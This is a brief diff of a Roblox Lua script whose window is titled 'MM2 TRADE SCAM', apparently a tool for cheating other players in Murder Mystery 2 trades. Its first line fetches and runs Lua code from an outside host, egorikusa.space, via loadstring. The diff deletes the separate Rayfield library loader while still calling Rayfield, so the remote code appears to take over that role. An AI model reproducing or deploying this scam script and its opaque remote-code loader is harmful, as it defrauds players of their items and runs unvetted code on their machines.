@@ -1,6 +1,4 @@
 loadstring(game:HttpGet("https://egorikusa.space/65c152f0ec22f6c649b92aa0.lua", true))()
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
 local Window = Rayfield:CreateWindow({
    Name = "🔀 MM2 TRADE SCAM 🔀",
    LoadingTitle = "MetaHub",
